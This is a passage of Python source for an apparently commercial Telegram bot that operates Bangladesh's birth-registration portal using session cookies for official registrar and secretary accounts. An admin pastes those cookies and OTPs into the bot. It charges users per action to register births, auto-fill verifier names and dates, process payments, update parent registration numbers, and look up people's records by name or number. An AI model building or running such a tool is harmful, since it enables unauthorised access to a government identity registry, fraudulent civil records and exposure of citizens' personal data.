    safe_send(m.chat.id, f"📂 {cmd.upper()} সেকশন:", reply_markup=markup)
    bot.register_next_step_handler_by_chat_id(m.chat.id, lambda msg: category_gate(msg, cmd))

def category_gate(m, cmd):
    try:
        if is_cancel(m): return
        if m.text and "Search ID" in m.text:
            markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
            safe_send(m.chat.id, "🆔 আইডি দিন:", reply_markup=markup)
            bot.register_next_step_handler_by_chat_id(m.chat.id, lambda msg: search_loop(msg, cmd))
        elif m.text and "All List" in m.text: 
            with session_lock: get_session(m.from_user.id)["current_search_val"] = ""
            fetch_list_ui(m.chat.id, m.from_user.id, cmd)
        else:
            safe_send(m.chat.id, "⚠️ সঠিক অপশন বেছে নিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, lambda msg: category_gate(msg, cmd))
    except Exception as e:
        logging.error(f"Category Gate Error: {e}")

def search_loop(m, cmd):
    try:
        if is_cancel(m): return
        if m.text:
            with session_lock: get_session(m.from_user.id)["current_search_val"] = m.text.strip()
            fetch_list_ui(m.chat.id, m.from_user.id, cmd)
        safe_send(m.chat.id, "🔍 আরও আইডি দিন (বা মেনুতে ফিরুন):")
        bot.register_next_step_handler_by_chat_id(m.chat.id, lambda msg: search_loop(msg, cmd))
    except Exception as e:
        logging.error(f"Search Loop Error: {e}")

def fetch_list_ui(chat_id, user_id, cmd, message_id=None):
    if cmd not in VALID_CMDS: return safe_send(chat_id, "❌ অজানা কমান্ড।")
    u_sess = get_session(user_id)
    perms = get_user_permissions(user_id)
    
    with session_lock:
        search_val = u_sess.get("current_search_val", "")
        mode = u_sess.get('mode')
        app_start = u_sess.get('app_start', 0)
        app_length = u_sess.get('app_length', 5)
    
    config = {'apps': ("/admin/br/applications/search", "/api/br/applications/search"),
              'corr': ("/admin/br/correction-applications/search", "/api/br/correction-applications/search"),
              'repr': ("/admin/br/reprint/view/applications/search", "/api/br/reprint/applications/search")}
    
    data_id_key = f"{cmd}_{mode}_data_id"
    with session_lock:
        data_id = u_sess.get("temp_data", {}).get(data_id_key)
    
    if not data_id:
        success, html = navigate_to(user_id, "https://bdris.gov.bd/admin/")
        if not success or not html: return safe_send(chat_id, "❌ পেজ লোড ব্যর্থ।")
        
        regex = rf'href="{re.escape(config[cmd][0])}\?data=([A-Za-z0-9_\-]+)"'
        id_match = re.search(regex, html)
        data_id = id_match.group(1) if id_match else None
        
        if not data_id: return safe_send(chat_id, "❌ ডাটা আইডি মেলেনি। সেশন চেক করুন।")
        with session_lock: u_sess["temp_data"][data_id_key] = data_id

    url = (f"https://bdris.gov.bd{config[cmd][1]}?data={data_id}&status=ALL&draw=1"
           f"&start={app_start}&length={app_length}&search[value]={quote(search_val)}&search[regex]=false&order[0][column]=1&order[0][dir]=desc")
    res = call_api(user_id, url)
    
    if not res or res.status_code != 200: 
        with session_lock: u_sess["temp_data"].pop(data_id_key, None)
        return safe_send(chat_id, "❌ ডেটা লোড ব্যর্থ।")
        
    try: 
        resp_json = res.json()
    except Exception as e: 
        logging.error(f"Parse Error / Expired Data ID for {user_id}: {e}")
        with session_lock: u_sess["temp_data"].pop(data_id_key, None)
        return safe_send(chat_id, "⚠️ সেশন এক্সপায়ার হয়েছে। লিস্ট বাটনে আবার ক্লিক করুন।")
        
    items = resp_json.get('data', [])
    if not items:
        if message_id: safe_delete(chat_id, message_id)
        return safe_send(chat_id, "📭 কোনো ডেটা পাওয়া যায়নি।")
        
    markup = telebot.types.InlineKeyboardMarkup()
    mode_text = "নিবন্ধক সেকশন" if mode == "CHAIRMAN" else "অথোরাইজড ইউজার"
    msg_text = f"📋 *{cmd.upper()} List* ({mode_text}):\n\n"
    pay_cost = get_service_cost(user_id, "pay")
    pay_btn_text = f"💳 Pay ({pay_cost}৳)" if pay_cost > 0 else "💳 Pay"
    
    for item in items:
        enc_id = item.get('encryptedId')
        status = str(item.get('status', '')).upper()
        if not enc_id: continue
        
        short_id = hashlib.md5(enc_id.encode()).hexdigest()[:8]
        
        with session_lock:
            u_sess["id_cache"][short_id] = enc_id
            u_sess["id_cache"].move_to_end(short_id)
            while len(u_sess["id_cache"]) > MAX_CACHE_SIZE:
                u_sess["id_cache"].popitem(last=False)
            
        app_id = item.get('id') or item.get('applicationId') or 'N/A'
        person_name = sanitize_name(item.get('personNameBn') or 'নাম অজানা')
        msg_text += f"🆔 `{app_id}` | {person_name}\n🚩 Status: `{status}`\n"
        
        btns = []
        if mode == "CHAIRMAN" and "RECEIVED" in status:
            if cmd == 'apps':
                btns.append(telebot.types.InlineKeyboardButton("✅ Register", callback_data=f"reg:{short_id}")) 
            else:
                btns.append(telebot.types.InlineKeyboardButton("📝 Corr", callback_data=f"coreg:{short_id}"))
        elif mode == "SECRETARY" and any(w in status for w in ["APPLIED", "PENDING", "PAYMENT", "UNPAID"]):
            btns.extend([
                telebot.types.InlineKeyboardButton(pay_btn_text, callback_data=f"pay:{short_id}"),
                telebot.types.InlineKeyboardButton("📥 Receive", callback_data=f"recv:{short_id}")
            ])
        if btns: markup.row(*btns)
        if perms.get("print") or user_id == ADMIN_ID:
            markup.row(telebot.types.InlineKeyboardButton("🖨️ Print PDF", callback_data=f"print:{short_id}"))
        msg_text += "━━━━━━━━━━━━━━\n"
        
    if not search_val:
        nav = []
        total = int(resp_json.get('recordsTotal', 0))
        if app_start > 0: nav.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev:{cmd}"))
        if app_start + app_length < total: nav.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next:{cmd}"))
        
        lengths = []
        for ln in [5, 10, 20]:
            label = f"{'✅' if app_length == ln else ''}{ln}/p"
            lengths.append(telebot.types.InlineKeyboardButton(label, callback_data=f"setlength:{cmd}:{ln}"))
            
        if nav: markup.row(*nav)
        if lengths: markup.row(*lengths)
        
    if len(msg_text) > MAX_MESSAGE_LENGTH: 
        msg_text = msg_text[:MAX_MESSAGE_LENGTH] + "\n\n⚠️ বাকি তথ্য কাটা গেছে।"
    
    if message_id: safe_edit(chat_id, message_id, msg_text, reply_markup=markup, parse_mode='Markdown')
    else: safe_send(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')

# ==========================================
# ১০. Search, UBRN Update ও Verifier Setup
# ==========================================
def process_set_default_verifier(m):
    if is_cancel(m): return
    uid, cid = m.from_user.id, m.chat.id
    ubrn = m.text.strip()
    if not ubrn.isdigit() or len(ubrn) != 17:
        safe_send(cid, "❌ সঠিক ১৭ ডিজিট UBRN দিন:")
        bot.register_next_step_handler_by_chat_id(cid, process_set_default_verifier)
        return

    wait = safe_send(cid, "⏳ ভেরিফায়ার যাচাই করা হচ্ছে...")
    
    def execute_set():
        try:
            fresh_sess = get_session(uid)
            ch_sess, _ = get_active_session(fresh_sess)
            _, active_csrf = get_active_session(fresh_sess)
            
            headers = {
                'User-Agent': fresh_sess.get("ua", "Mozilla/5.0"),
                'Referer': 'https://bdris.gov.bd/admin/',
                'client': 'bris',
                'x-csrf-token': active_csrf,
                'x-requested-with': 'XMLHttpRequest'
            }
            res_info = ch_sess.get(f"https://bdris.gov.bd/api/br/is-person-alive-by-ubrn/{ubrn}", headers=headers, timeout=HTTP_TIMEOUT)
            
            safe_delete(cid, wait.message_id)
            if res_info and res_info.status_code == 200:
                v_data = res_info.json()
                v_name = v_data.get('personNameBn') or v_data.get('nameBn') or v_data.get('name')
                if v_name:
                    access_collection.update_one({"chat_id": uid}, {"$set": {"verifier_ubrn": ubrn, "verifier_name": v_name}})
                    safe_send(cid, f"✅ আপনার ডিফল্ট ভেরিফায়ার সেট করা হয়েছে:\n👤 *{v_name}*\n🔢 `{ubrn}`", parse_mode="Markdown", reply_markup=generate_main_menu(cid, uid))
                else:
                    safe_send(cid, "❌ সার্ভারে নাম পাওয়া যায়নি।")
            else:
                safe_send(cid, "❌ ভেরিফায়ার পাওয়া যায়নি বা সার্ভার এরর।")
        except Exception as e:
            logging.error(f"Set Verifier Error: {e}")
            safe_send(cid, "❌ ডেটা প্রসেসিং এরর।")
            
    Thread(target=execute_set, daemon=True).start()

def process_reg_verifier_step(m, uid, enc_id, save_default=False):
    if is_cancel(m): return
    ubrn = m.text.strip()
    if not ubrn.isdigit() or len(ubrn) != 17:
        safe_send(m.chat.id, "❌ সঠিক ১৭ ডিজিট UBRN দিন:")
        bot.register_next_step_handler_by_chat_id(m.chat.id, lambda msg: process_reg_verifier_step(msg, uid, enc_id, save_default))
        return

    wait = safe_send(m.chat.id, "⏳ ভেরিফায়ারের তথ্য খোঁজা হচ্ছে...")

    def execute_registration():
        try:
            fresh_sess = get_session(uid)
            ch_sess, _ = get_active_session(fresh_sess)
            _, active_csrf = get_active_session(fresh_sess)
            with session_lock: otp_val = fresh_sess.get("ch_otp")

            headers_info = {
                'User-Agent': fresh_sess.get("ua", "Mozilla/5.0"),
                'Referer': 'https://bdris.gov.bd/admin/',
                'client': 'bris',
                'x-csrf-token': active_csrf,
                'x-requested-with': 'XMLHttpRequest'
            }

            res_info = ch_sess.get(f"https://bdris.gov.bd/api/br/is-person-alive-by-ubrn/{ubrn}", headers=headers_info, timeout=HTTP_TIMEOUT)
            if not res_info or res_info.status_code != 200:
                safe_delete(m.chat.id, wait.message_id)
                safe_send(m.chat.id, "❌ ভেরিফায়ার UBRN যাচাই করা যায়নি।")
                return

            v_data = res_info.json()
            v_name = v_data.get('personNameBn') or v_data.get('nameBn') or v_data.get('name')
            
            if save_default and v_name:
                access_collection.update_one({"chat_id": uid}, {"$set": {"verifier_ubrn": ubrn, "verifier_name": v_name}})

            safe_edit(m.chat.id, wait.message_id, f"✅ ভেরিফায়ার: {v_name}\n⏳ সাবমিট করা হচ্ছে...")

            today = datetime.now().strftime("%d/%m/%Y")
            
            payload_data = {
                "birthPlaceAndDobVerifierName": f"  {v_name} ",
                "birthPlaceAndDobVerifierBrn": ubrn,
                "birthPlaceAndDobVerificationDate": today,
                "permAddrVerifierName": f"  {v_name} ",
                "permAddrVerifierBrn": ubrn,
                "permAddrVerificationDate": today,
                "otp": otp_val,
                "data": enc_id
            }

            headers_post = {
                'User-Agent': fresh_sess.get("ua", "Mozilla/5.0"),
                'Referer': 'https://bdris.gov.bd/admin/',
                'Origin': 'https://bdris.gov.bd',
                'client': 'bris',
                'x-csrf-token': active_csrf,
                'x-requested-with': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }

            res_reg = ch_sess.post("https://bdris.gov.bd/api/br/application/register", headers=headers_post, data=payload_data, timeout=HTTP_TIMEOUT)

            safe_delete(m.chat.id, wait.message_id)
            if res_reg and res_reg.status_code == 200:
                safe_send(m.chat.id, "✅ নতুন জন্ম নিবন্ধন সফলভাবে রেজিস্টার হয়েছে!")
            else:
                safe_send(m.chat.id, f"❌ রেজিস্ট্রেশন ব্যর্থ! সার্ভার রেসপন্স: {res_reg.status_code if res_reg else 'None'}")
        except Exception as e:
            logging.error(f"Reg Flow Error: {e}")
            safe_delete(m.chat.id, wait.message_id)
            safe_send(m.chat.id, "❌ রেজিস্ট্রেশনে এরর হয়েছে।")

    Thread(target=execute_registration, daemon=True).start()

def process_search_by_name(m):
    try:
        if is_cancel(m): return
        if not m.text: return
        
        uid = m.from_user.id
        raw_name = m.text.strip()
        safe_name = sanitize_name(raw_name)
        
        payload = f"personNameBn={quote(raw_name)}&personNameEn=&nameLang=BENGALI"
        extra_h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://bdris.gov.bd'}
        
        navigate_to(uid, "https://bdris.gov.bd/admin/br/advanced-search-by-name")
        res = call_api(uid, "https://bdris.gov.bd/api/br/advanced-search-by-name", method="POST", data=payload, extra_headers=extra_h)
        
        if res and res.status_code == 200:
            try:
                data = res.json()
                if isinstance(data, list):
                    items = data
                elif isinstance(data, dict):
                    items = data.get('data', [])
                    if not isinstance(items, list): items = [data]
                else: items = []
                
                if not items:
                    safe_send(m.chat.id, f"📭 *'{safe_name}'* নামে কোনো তথ্য পাওয়া যায়নি।", parse_mode='Markdown')
                else:
                    msg_text = f"📊 *Search: {safe_name}* — {len(items)} টি ফলাফল\n\n"
                    for i, item in enumerate(items[:MAX_SEARCH_RESULTS], 1):
                        ubrn = item.get('ubrn') or item.get('birthRegistrationNo', 'N/A')
                        name = sanitize_name(item.get('personNameBn') or item.get('name', 'অজানা'))
                        dob = item.get('dateOfBirth', '')
                        msg_text += f"{i}. 👤 {name}\n   🔢 UBRN: `{ubrn}`\n   📅 DOB: {dob}\n\n"
                    
                    if len(items) > MAX_SEARCH_RESULTS:
                        msg_text += f"_...আরও {len(items)-MAX_SEARCH_RESULTS} টি ফলাফল আছে_\n"
                        
                    sent = safe_send(m.chat.id, msg_text[:MAX_MESSAGE_LENGTH], parse_mode='Markdown')
                    if not sent: safe_send(m.chat.id, "❌ ডেটা অনেক বড়, পাঠানো সম্ভব হয়নি।")
            except Exception as e:
                logging.error(f"Search Result Error [{uid}]: {e}")
                safe_send(m.chat.id, "❌ ডেটা প্রসেস করতে সমস্যা হয়েছে।")
        else:
            safe_send(m.chat.id, "❌ কোনো তথ্য পাওয়া যায়নি বা সার্ভার এরর।")
        
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
        safe_send(m.chat.id, "🔍 আরও নাম দিন:", reply_markup=markup)
        bot.register_next_step_handler_by_chat_id(m.chat.id, process_search_by_name)
    except Exception as e:
        logging.error(f"Search Loop Error: {e}")

def process_search_by_ubrn(m):
    try:
        if is_cancel(m): return
        if not m.text: return
        uid = m.from_user.id
        ubrn = m.text.strip()
        if not ubrn.isdigit() or len(ubrn) != 17:
            safe_send(m.chat.id, "❌ UBRN অবশ্যই ১৭ ডিজিট হতে হবে। আবার দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, process_search_by_ubrn)
            return

        res = call_api(uid, f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}")
        if res and res.status_code == 200:
            try:
                formatted_json = json.dumps(res.json(), indent=2, ensure_ascii=False)
                msg_text = f"📊 *UBRN Result:*\n```json\n{formatted_json}\n```"
                safe_send(m.chat.id, msg_text, parse_mode='Markdown')
            except Exception as e: 
                logging.error(f"UBRN Parse Error: {e}")
                safe_send(m.chat.id, f"Raw Data:\n`{res.text}`", parse_mode='Markdown')
        else: 
            safe_send(m.chat.id, "❌ তথ্য পাওয়া যায়নি।")
        
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
        safe_send(m.chat.id, "🔍 আরও UBRN দিন:", reply_markup=markup)
        bot.register_next_step_handler_by_chat_id(m.chat.id, process_search_by_ubrn)
    except Exception as e:
        logging.error(f"UBRN Search Error: {e}")

def start_ubrn_flow(m):
    try:
        u_sess = get_session(m.from_user.id)
        with session_lock: u_sess["temp_data"]["ubrn"] = {}
        navigate_to(m.from_user.id, "https://bdris.gov.bd/admin/br/parents-ubrn-update")
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True).add("🏠 Back to Menu")
        safe_send(m.chat.id, "১. ব্যক্তির ১৭ ডিজিট UBRN দিন:", reply_markup=markup)
        bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_p_step)
    except Exception as e:
        logging.error(f"Start UBRN Flow Error: {e}")

def _validate_ubrn_input(text):
    t = text.strip()
    if t == '0': return ''
    if not t.isdigit() or len(t) != 17: return None
    return t

def ubrn_p_step(m):
    try:
        if is_cancel(m): return
        if not m.text: return
        val = _validate_ubrn_input(m.text)
        if val is None:
            safe_send(m.chat.id, "❌ সঠিক ১৭ ডিজিট UBRN দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_p_step)
            return
        with session_lock: get_session(m.from_user.id)["temp_data"]["ubrn"]["p"] = val
        safe_send(m.chat.id, "২. পিতার UBRN দিন (না থাকলে 0 দিন):")
        bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_f_step)
    except Exception as e:
        logging.error(f"UBRN Step 1 Error: {e}")

def ubrn_f_step(m):
    try:
        if is_cancel(m): return
        if not m.text: return
        val = _validate_ubrn_input(m.text)
        if val is None:
            safe_send(m.chat.id, "❌ সঠিক ১৭ ডিজিট UBRN বা 0 দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_f_step)
            return
        with session_lock: get_session(m.from_user.id)["temp_data"]["ubrn"]["f"] = val
        safe_send(m.chat.id, "৩. মাতার UBRN দিন (না থাকলে 0 দিন):")
        bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_m_step)
    except Exception as e:
        logging.error(f"UBRN Step 2 Error: {e}")

def ubrn_m_step(m):
    try:
        if is_cancel(m): return
        if not m.text: return
        val = _validate_ubrn_input(m.text)
        if val is None:
            safe_send(m.chat.id, "❌ সঠিক ১৭ ডিজিট UBRN বা 0 দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_m_step)
            return
        with session_lock: get_session(m.from_user.id)["temp_data"]["ubrn"]["m"] = val
        safe_send(m.chat.id, "৪. মোবাইল নম্বর দিন (01XXXXXXXXX):")
        bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_ph_step)
    except Exception as e:
        logging.error(f"UBRN Step 3 Error: {e}")

def ubrn_ph_step(m):
    try:
        if is_cancel(m): return
        if not m.text: return
        raw_phone = m.text.strip()
        if not _PHONE_RE.match(raw_phone):
            safe_send(m.chat.id, "❌ অবৈধ মোবাইল নম্বর। 01XXXXXXXXX ফরম্যাটে দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_ph_step)
            return

        if raw_phone.startswith('+880'): phone = raw_phone
        elif raw_phone.startswith('880'): phone = '+' + raw_phone
        elif raw_phone.startswith('0'): phone = '+88' + raw_phone
        else: phone = raw_phone
        
        uid = m.from_user.id
        u_sess = get_session(uid)
        with session_lock:
            u_sess["temp_data"]["ubrn"]["ph"] = phone
            d = dict(u_sess["temp_data"]["ubrn"])

        res = call_api(uid, f"https://bdris.gov.bd/admin/br/parents-ubrn-update/send-otp?personBrn={d.get('p','')}&fatherBrn={d.get('f','')}&motherBrn={d.get('m','')}&phone={quote(phone)}&email=", method="POST", force_sec=True)
        if res and res.status_code == 200:
            safe_send(m.chat.id, "✅ OTP পাঠানো হয়েছে! OTP দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_final)
        else: 
            safe_send(m.chat.id, "❌ OTP পাঠাতে ব্যর্থ।")
    except Exception as e:
        logging.error(f"UBRN Step 4 Error: {e}")

def ubrn_final(m):
    try:
        if is_cancel(m): return
        if not m.text: return
        uid = m.from_user.id
        otp = m.text.strip()
        if not otp.isdigit():
            safe_send(m.chat.id, "❌ OTP শুধুমাত্র সংখ্যা হওয়া উচিত। আবার দিন:")
            bot.register_next_step_handler_by_chat_id(m.chat.id, ubrn_final)
            return

        u_sess = get_session(uid)
        with session_lock: 
            d = dict(u_sess["temp_data"].get("ubrn", {}))
            csrf = u_sess.get("csrf")

        payload = {
            '_csrf': csrf, 'personBrn': d.get('p',''), 'fatherBrn': d.get('f',''), 
            'motherBrn': d.get('m',''), 'phone': d.get('ph',''), 'email': '', 'otp': otp
        }
        res = call_api(uid, "https://bdris.gov.bd/admin/br/parents-ubrn-update", method="POST", data=payload, force_sec=True)
        if res and res.status_code == 200: 
            safe_send(m.chat.id, "✅ UBRN আপডেট সফল!", reply_markup=generate_main_menu(m.chat.id, uid))
        else: 
            safe_send(m.chat.id, "❌ আপডেট ব্যর্থ! OTP চেক করুন।")
    except Exception as e:
        logging.error(f"UBRN Final Step Error: {e}")

# ==========================================
# ১১. অ্যাডমিন কন্ট্রোল ও কলব্যাক হ্যান্ডলার
# ==========================================
def admin_edit_field(m, target_uid, field):
    try:
        if is_cancel(m): return
        if not m.text: return
        val = m.text.strip()
        
        t_sess = get_session(target_uid)
        with session_lock:
            if field == "SEC":
                s, t = extract_sid_tsid(val)
                if s and t: 
                    # 📌 ডুপ্লিকেট চেক
                    if s == t_sess["ch_session"].cookies.get("SESSION"):
                        return safe_send(m.chat.id, "❌ নিবন্ধক (CH) এবং অথোরাইজড ইউজারের (SEC) সেশন একই হতে পারবে না। আলাদা সেশন দিন।")
                    
                    _set_session_cookies(t_sess["req_session"], s, t)
                    t_sess["sec_alive"] = True
                    t_sess["is_alive"] = True
                else: return safe_send(m.chat.id, "❌ ভুল ফরম্যাট।")
                
            elif field == "CH":
                s, t = extract_sid_tsid(val)
                if s and t: 
                    # 📌 ডুপ্লিকেট চেক
                    if s == t_sess["req_session"].cookies.get("SESSION"):
                        return safe_send(m.chat.id, "❌ নিবন্ধক (CH) এবং অথোরাইজড ইউজারের (SEC) সেশন একই হতে পারবে না। আলাদা সেশন দিন।")
                        
                    _set_session_cookies(t_sess["ch_session"], s, t)
                    t_sess["ch_alive"] = True
                    t_sess["is_alive"] = t_sess.get("sec_alive", False) or t_sess["ch_alive"]
                else: return safe_send(m.chat.id, "❌ ভুল ফরম্যাট।")
                
            elif field == "OTP":
                if not val.isdigit(): return safe_send(m.chat.id, "❌ OTP শুধুমাত্র সংখ্যা।")
                t_sess["ch_otp"] = val

        save_session_to_db(target_uid, t_sess)
        manage_ping_worker(target_uid, t_sess) # 📌 ওয়ার্কার আপডেট করা
        safe_send(m.chat.id, f"✅ User {target_uid} এর {field} আপডেট হয়েছে!")
    except Exception as e:
        logging.error(f"Admin Edit Error: {e}")
        safe_send(m.chat.id, "❌ আপডেট ব্যর্থ।")

def refresh_admin_panel(chat_id, target_user_id, message_id=None):
    rec = access_collection.find_one({"chat_id": target_user_id}) or {}
    p = rec.get("permissions", DEFAULT_PERMS)
    t_sess = get_session(target_user_id)
    with session_lock:
        ch_otp = t_sess.get('ch_otp', 'N/A')
        
    msg = f"👤 User: `{target_user_id}`\n💰 Balance: {rec.get('balance', 0)}৳\n🔑 CH OTP: `{ch_otp}`\n\nপারমিশন:"
    
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("✏️ SEC", callback_data=f"edsec:{target_user_id}"),
        telebot.types.InlineKeyboardButton("✏️ CH", callback_data=f"edch:{target_user_id}"),
        telebot.types.InlineKeyboardButton("✏️ OTP", callback_data=f"edotp:{target_user_id}")
    )
    perm_labels = [("apps", "Apps"), ("corr", "Corr"), ("repr", "Repr"), ("search", "Search"), ("ubrn_update", "UBRN Update"), ("server_pdf", "Srv PDF"), ("print", "Inline Print")]
    for k, n in perm_labels:
        st = p.get(k, True)
        markup.row(telebot.types.InlineKeyboardButton(f"{'❌ Disable' if st else '✅ Enable'} {n}", callback_data=f"tgl:{target_user_id}:{k}:{'off' if st else 'on'}"))
    
    if rec.get("status", "allowed") == "allowed": 
        markup.row(telebot.types.InlineKeyboardButton("🚫 Block User", callback_data=f"block:{target_user_id}"))
    else: 
        markup.row(telebot.types.InlineKeyboardButton("✅ Unblock User", callback_data=f"unblock:{target_user_id}"))

    if message_id: safe_edit(chat_id, message_id, msg, reply_markup=markup)
    else: safe_send(chat_id, msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    uid, cid = call.from_user.id, call.message.chat.id
    if is_rate_limited(uid): return bot.answer_callback_query(call.id, "⚠️ একটু ধীরে!", show_alert=True)
    if not check_user_access(uid, call.from_user.first_name): return bot.answer_callback_query(call.id, "🚫 অ্যাক্সেস নেই!", show_alert=True)

    u_sess = get_session(uid)
    parts = call.data.split(':')
    action = parts[0]
    sid = parts[1] if len(parts) > 1 else ""

    with session_lock:
        enc_id = u_sess.get("id_cache", {}).get(sid)
        mode = u_sess.get("mode")

    if action in ["pay", "recv", "reg", "coreg", "print"] and not enc_id:
        return bot.answer_callback_query(call.id, "❌ ক্যাশ এক্সপায়ার হয়েছে! লিস্ট রিফ্রেশ করুন।", show_alert=True)

    if action in ["next", "prev"]:
        cmd = sid
        if cmd not in VALID_CMDS: return bot.answer_callback_query(call.id, "❌ অজানা কমান্ড।", show_alert=True)
        with session_lock:
            app_length = u_sess.get("app_length", 5)
            if action == "next": u_sess["app_start"] = u_sess.get("app_start", 0) + app_length
            else: u_sess["app_start"] = max(0, u_sess.get("app_start", 0) - app_length)
        bot.answer_callback_query(call.id)
        fetch_list_ui(cid, uid, cmd, call.message.message_id)

    elif action == "setlength" and len(parts) == 3:
        cmd = parts[1]
        try: length = int(parts[2])
        except: return bot.answer_callback_query(call.id, "❌ অবৈধ মান।", show_alert=True)
        with session_lock: 
            u_sess["app_length"] = length
            u_sess["app_start"] = 0
        save_session_to_db(uid, u_sess)
        bot.answer_callback_query(call.id, f"✅ {length}টি করে দেখানো হবে।")
        fetch_list_ui(cid, uid, cmd, call.message.message_id)

    elif action == "reqrecharge":
        safe_send(cid, "💼 *রিচার্জের নিয়ম:*\n১. বিকাশ/নগদ নম্বরে Send Money করুন\n২. TrxID মেসেজে পাঠান:", parse_mode="Markdown")
        bot.register_next_step_handler_by_chat_id(cid, process_recharge)
        bot.answer_callback_query(call.id)

    elif action == "apprvbal" and uid == ADMIN_ID:
        if len(parts) < 3: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        try: target = int(parts[1])
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        safe_send(cid, f"User {target} এর জন্য টাকার পরিমাণ দিন:")
        bot.register_next_step_handler_by_chat_id(cid, lambda m: admin_add_balance_step(m, target, parts[2], call.message.message_id))
        safe_edit(cid, call.message.message_id, call.message.text + "\n\n✅ Processing...")
        bot.answer_callback_query(call.id)

    elif action == "rejbal" and uid == ADMIN_ID:
        if len(parts) < 3: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        try: target = int(parts[1])
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        
        try: recharge_logs.update_one({"_id": parts[2]}, {"$set": {"status": "rejected"}})
        except Exception as e: logging.error(f"Reject Balance Error: {e}")
            
        safe_send(target, "❌ আপনার রিচার্জ রিকোয়েস্ট অ্যাডমিন বাতিল করেছেন।")
        safe_edit(cid, call.message.message_id, call.message.text + "\n\n❌ Rejected")
        bot.answer_callback_query(call.id, "বাতিল করা হয়েছে।")

    elif action == "admuser" and uid == ADMIN_ID:
        try: target = int(parts[1])
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        refresh_admin_panel(cid, target, call.message.message_id)
        bot.answer_callback_query(call.id)

    elif action == "tgl" and uid == ADMIN_ID and len(parts) == 4:
        try: target_id = int(parts[1])
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        perm_key, state_val = parts[2], parts[3]
        if perm_key not in DEFAULT_PERMS or state_val not in ("on", "off"): 
            return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        access_collection.update_one({"chat_id": target_id}, {"$set": {f"permissions.{perm_key}": state_val == "on"}})
        bot.answer_callback_query(call.id, f"✅ {perm_key} আপডেট হয়েছে!")
        refresh_admin_panel(cid, target_id, call.message.message_id)

    elif action == "edsec" and uid == ADMIN_ID:
        try: target_uid = int(sid)
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        safe_send(cid, f"User {sid} এর নতুন SEC সেশন দিন:")
        bot.register_next_step_handler_by_chat_id(cid, lambda m: admin_edit_field(m, target_uid, "SEC"))
        bot.answer_callback_query(call.id)

    elif action == "edch" and uid == ADMIN_ID:
        try: target_uid = int(sid)
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        safe_send(cid, f"User {sid} এর নতুন CH সেশন দিন:")
        bot.register_next_step_handler_by_chat_id(cid, lambda m: admin_edit_field(m, target_uid, "CH"))
        bot.answer_callback_query(call.id)

    elif action == "edotp" and uid == ADMIN_ID:
        try: target_uid = int(sid)
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        safe_send(cid, f"User {sid} এর নতুন OTP দিন:")
        bot.register_next_step_handler_by_chat_id(cid, lambda m: admin_edit_field(m, target_uid, "OTP"))
        bot.answer_callback_query(call.id)

    elif action == "block" and uid == ADMIN_ID:
        try: target_uid = int(sid)
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        access_collection.update_one({"chat_id": target_uid}, {"$set": {"status": "blocked"}})
        bot.answer_callback_query(call.id, "✅ ব্লক করা হয়েছে।", show_alert=True)
        safe_send(target_uid, "🚫 আপনাকে ব্লক করা হয়েছে।")

    elif action == "unblock" and uid == ADMIN_ID:
        try: target_uid = int(sid)
        except: return bot.answer_callback_query(call.id, "❌ Error", show_alert=True)
        access_collection.update_one({"chat_id": target_uid}, {"$set": {"status": "allowed"}})
        bot.answer_callback_query(call.id, "✅ আনব্লক করা হয়েছে।", show_alert=True)
        safe_send(target_uid, "✅ আপনার অ্যাক্সেস পুনরায় চালু হয়েছে।")

    elif action == "pay":
        cost = get_service_cost(uid, "pay")
        task_id = f"pay_{uid}_{enc_id}"
        
        with download_lock:
            if task_id in active_downloads: 
                return bot.answer_callback_query(call.id, "⚠️ রিকোয়েস্ট প্রসেসিং-এ আছে...", show_alert=True)
            active_downloads.add(task_id)
            
        if cost > 0:
            if not deduct_balance(uid, cost):
                with download_lock: active_downloads.discard(task_id)
                return bot.answer_callback_query(call.id, f"❌ ব্যালেন্স নেই ({cost}৳)।", show_alert=True)
                
        bot.answer_callback_query(call.id, "⏳ পেমেন্ট প্রসেস হচ্ছে...")
        
        def process_payment():
            try:
                fresh_sess = get_session(uid)
                _, active_csrf = get_active_session(fresh_sess)
                
                with session_lock: 
                    curr_sharok = fresh_sess.get("sharok_no", 1)
                    fresh_sess["sharok_no"] = curr_sharok + 1
                    
                data = {
                    'data': enc_id, 'chalanNo': '', 'chalanDate': '', 
                    'chalanPaymentType': 'CASH', 'chalanBank': 'Bangladesh Bank',
